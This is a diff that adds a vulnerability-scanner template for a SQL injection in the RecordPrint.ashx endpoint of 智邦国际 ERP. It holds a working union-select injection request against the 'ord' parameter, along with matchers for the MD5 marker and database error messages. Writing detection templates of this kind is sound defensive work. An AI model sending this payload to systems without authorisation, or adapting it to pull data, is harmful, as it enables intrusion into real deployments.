@@ -1,0 +1,34 @@
+id: zbintel-erp-recordprint-ashx-sqli
+info:
+  name: 智邦国际ERP RecordPrint.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detected a SQL injection vulnerability in 智邦国际ERP's RecordPrint.ashx endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /SYSN/json/pcclient/RecordPrint.ashx?sort=1&ord=-1%27%20union%20select%20sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "SystemErrorSign"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
